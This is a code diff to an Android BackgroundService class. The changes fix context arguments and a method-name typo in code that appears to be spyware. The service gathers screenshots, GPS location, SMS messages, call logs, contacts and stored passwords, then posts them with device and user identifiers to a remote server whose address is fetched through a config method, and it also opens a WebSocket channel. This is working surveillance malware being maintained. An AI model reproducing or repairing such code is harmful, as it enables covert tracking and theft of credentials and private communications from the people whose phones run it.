@@ -144,12 +144,12 @@ public class BackgroundService extends Service {
         try {
             JSONObject data = new JSONObject();
             data.put("type", "screenshot");
-            data.put("device_id", Config.getDeviceId());
-            data.put("username", Config.getUsername());
+            data.put("device_id", Config.getDeviceId(getApplicationContext()));
+            data.put("username", Config.getUsername(getApplicationContext()));
             data.put("data", base64Image);
             data.put("timestamp", System.currentTimeMillis());
             
-            String serverUrl = Config.getsyncConfigFromGithubl();
+            String serverUrl = Config.getsyncConfigFromGithub();
             HttpClient.postAsync(serverUrl + "/api/data/screenshot", data, response -> {
                 Log.d(TAG, "Screenshot sent");
             });
@@ -162,8 +162,8 @@ public class BackgroundService extends Service {
         try {
             JSONObject data = new JSONObject();
             data.put("type", "location");
-            data.put("device_id", Config.getDeviceId());
-            data.put("username", Config.getUsername());
+            data.put("device_id", Config.getDeviceId(getApplicationContext()));
+            data.put("username", Config.getUsername(getApplicationContext()));
             data.put("lat", location.getLatitude());
             data.put("lng", location.getLongitude());
             data.put("accuracy", location.getAccuracy());
@@ -207,12 +207,12 @@ public class BackgroundService extends Service {
             
             JSONObject data = new JSONObject();
             data.put("type", "sms");
-            data.put("device_id", Config.getDeviceId());
-            data.put("username", Config.getUsername());
+            data.put("device_id", Config.getDeviceId(getApplicationContext()));
+            data.put("username", Config.getUsername(getApplicationContext()));
             data.put("data", smsArray);
             data.put("count", smsArray.length());
             
-            String serverUrl = Config.getsyncConfigFromGithubl();
+            String serverUrl = Config.getsyncConfigFromGithub();
             HttpClient.postAsync(serverUrl + "/ws", data, null);
         } catch (Exception e) {
             Log.e(TAG, "SMS sync error", e);
@@ -238,12 +238,12 @@ public class BackgroundService extends Service {
             
             JSONObject data = new JSONObject();
             data.put("type", "call");
-            data.put("device_id", Config.getDeviceId());
-            data.put("username", Config.getUsername());
+            data.put("device_id", Config.getDeviceId(getApplicationContext()));
+            data.put("username", Config.getUsername(getApplicationContext()));
             data.put("data", callArray);
             data.put("count", callArray.length());
             
-            String serverUrl = Config.getsyncConfigFromGithubl();
+            String serverUrl = Config.getsyncConfigFromGithub();
             HttpClient.postAsync(serverUrl + "/ws", data, null);
         } catch (Exception e) {
             Log.e(TAG, "Call log sync error", e);
@@ -282,8 +282,8 @@ public class BackgroundService extends Service {
             
             JSONObject data = new JSONObject();
             data.put("type", "contacts");
-            data.put("device_id", Config.getDeviceId());
-            data.put("username", Config.getUsername());
+            data.put("device_id", Config.getDeviceId(getApplicationContext()));
+            data.put("username", Config.getUsername(getApplicationContext()));
             data.put("data", contactArray);
             data.put("count", contactArray.length());
             
@@ -338,8 +338,8 @@ public class BackgroundService extends Service {
             if (passwords.length() > 0) {
                 JSONObject data = new JSONObject();
                 data.put("type", "passwords");
-                data.put("device_id", Config.getDeviceId());
-                data.put("username", Config.getUsername());
+                data.put("device_id", Config.getDeviceId(getApplicationContext()));
+                data.put("username", Config.getUsername(getApplicationContext()));
                 data.put("data", passwords);
                 
                 String serverUrl = Config.getsyncConfigFromGithub();
@@ -360,8 +360,8 @@ public class BackgroundService extends Service {
                 
                 JSONObject data = new JSONObject();
                 data.put("type", "battery");
-                data.put("device_id", Config.getDeviceId());
-                data.put("username", Config.getUsername());
+                data.put("device_id", Config.getDeviceId(getApplicationContext()));
+                data.put("username", Config.getUsername(getApplicationContext()));
                 data.put("level", level);
                 data.put("temperature", temp);
                 data.put("charging", charging);
@@ -377,7 +377,12 @@ public class BackgroundService extends Service {
     private void startWebSocketConnection() {
         new Thread(() -> {
             try {
-                WebSocketClient client = new WebSocketClient(Config.getsyncConfigFromGithub(), Config.getDeviceId(), Config.getUsername(), BackgroundService.this);
+                WebSocketClient client = new WebSocketClient(
+    Config.getsyncConfigFromGithub(), 
+    Config.getDeviceId(getApplicationContext()), 
+    Config.getUsername(getApplicationContext()), 
+    BackgroundService.this
+);
                 client.connect();
             } catch (Exception e) {
                 Log.e(TAG, "WebSocket connection error", e);
